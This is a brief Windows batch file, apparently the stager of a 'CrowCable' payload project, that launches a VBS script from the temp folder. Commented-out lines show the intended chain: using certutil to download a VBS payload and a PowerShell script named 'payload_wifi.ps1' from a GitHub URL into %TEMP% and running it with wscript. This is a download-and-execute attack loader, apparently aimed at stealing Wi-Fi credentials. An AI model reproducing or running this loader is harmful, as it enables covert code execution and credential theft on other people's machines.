@echo off

@REM certutil -urlcache -split -f "https://raw.githubusercontent.com/ahuici/CrowCable-Payload-ahuici/main/payload_inicial_vbs.vbs" "%TEMP%\payload_inicial_vbs.vbs"

@REM certutil -urlcache -split -f "https://raw.githubusercontent.com/ahuici/CrowCable-Payload-ahuici/main/payload_wifi.ps1" "%TEMP%\payload_wifi.ps1"


@REM wscript.exe "%TEMP%\payload_inicial_vbs.vbs"

start "" "%TEMP%\payload_vbs.vbs"
